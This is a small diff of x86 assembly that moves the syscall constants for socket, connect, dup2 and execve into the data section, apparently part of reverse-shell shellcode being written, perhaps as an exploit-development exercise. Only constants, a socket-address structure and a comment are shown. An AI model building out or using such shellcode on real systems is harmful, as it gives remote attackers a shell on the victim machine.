@@ -12,6 +12,12 @@ section .bss
     endstruc
 
 section .data
+    sys_connect equ 0x16a
+    sys_socket  equ 0x167
+    sys_execve  equ 0xb
+    sys_dup2    equ 0x3f
+
+    AF_INET equ 2
     sin:
     istruc sockaddr_in
         at sockaddr_in.family, dw AF_INET
@@ -21,14 +27,6 @@ section .data
     iend
 
 _start:
-    ; void write(1, welcome, strlen(welcome));
-    sys_connect equ 0x16a
-    sys_socket  equ 0x167
-    sys_execve  equ 0xb
-    sys_dup2    equ 0x3f
-
-    AF_INET equ 2
-
 
     socket:
         ; (INT) eax = socket(AF_INET, SOCK_STREAM, 0);
